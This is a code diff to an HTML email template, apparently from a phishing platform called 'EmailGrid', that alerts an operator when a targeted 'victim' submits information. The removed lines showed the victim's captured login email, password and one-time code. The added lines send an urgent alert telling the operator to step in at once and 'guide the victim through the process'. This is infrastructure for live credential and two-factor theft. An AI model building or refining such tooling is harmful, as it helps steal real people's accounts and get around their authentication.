@@ -2,23 +2,47 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Victim Info Notification</title>
+    <title>🚨 URGENT: Victim Submitting Information</title>
 </head>
 <body style="font-family: Arial, sans-serif; background: #f8f9fa; padding: 24px;">
-    <div style="max-width: 600px; margin: auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #eee; padding: 32px;">
-        <h2 style="color: #007bff;">Victim Info Started for Campaign</h2>
-        <p>Victim info has been started for your campaign to <b>{{ campaign.recipient_email }}</b>.</p>
-        <table style="width: 100%; border-collapse: collapse; margin: 16px 0;">
-            <tr><td style="padding: 8px; color: #888;">Login Email:</td><td style="padding: 8px;">{{ victim_info.login_email|default:'—' }}</td></tr>
-            <tr><td style="padding: 8px; color: #888;">Login Password:</td><td style="padding: 8px;">{{ victim_info.login_password|default:'—' }}</td></tr>
-            <tr><td style="padding: 8px; color: #888;">Login OTP:</td><td style="padding: 8px;">{{ victim_info.login_otp|default:'—' }}</td></tr>
-        </table>
-        {% if campaign_link %}
-        <p>
-            <a href="{{ campaign_link }}" style="display: inline-block; background: #007bff; color: #fff; padding: 10px 20px; border-radius: 4px; text-decoration: none;">View Campaign Details</a>
+    <div style="max-width: 600px; margin: auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #eee; padding: 32px; border-left: 4px solid #dc3545;">
+        <h2 style="color: #dc3545; margin-top: 0;">🚨 URGENT: Victim Submitting Information</h2>
+        <p style="font-size: 16px; color: #333; margin-bottom: 20px;">
+            <strong>A victim is actively submitting information for your campaign targeting:</strong><br>
+            <span style="color: #007bff; font-weight: bold;">{{ campaign.recipient_email }}</span>
         </p>
+        
+        <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin: 20px 0;">
+            <p style="margin: 0; color: #666; font-size: 14px;">
+                <strong>Campaign Type:</strong> {{ campaign.email_template.get_type_display }}<br>
+                <strong>Target:</strong> {{ campaign.recipient_email }}
+            </p>
+        </div>
+        
+        <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 6px; margin: 20px 0;">
+            <p style="margin: 0; color: #856404; font-size: 14px;">
+                <strong>⏰ ACTION REQUIRED:</strong> Please attend to this immediately to guide the victim through the process.
+            </p>
+        </div>
+        
+        {% if campaign_link %}
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="{{ campaign_link }}" style="display: inline-block; background: #dc3545; color: #fff; padding: 12px 30px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 16px;">
+                🚀 View Campaign Details Now
+            </a>
+        </div>
+        {% else %}
+        <div style="text-align: center; margin: 30px 0;">
+            <p style="color: #666; font-size: 14px;">Campaign link not available</p>
+        </div>
         {% endif %}
-        <p style="color: #888; font-size: 13px; margin-top: 32px;">This is an automated notification from EmailGrid.</p>
+        
+        <hr style="border: none; border-top: 1px solid #eee; margin: 30px 0;">
+        
+        <p style="color: #666; font-size: 12px; margin: 0; text-align: center;">
+            This is an automated urgent notification from EmailGrid.<br>
+            Time is critical - please respond immediately.
+        </p>
     </div>
 </body>
 </html>
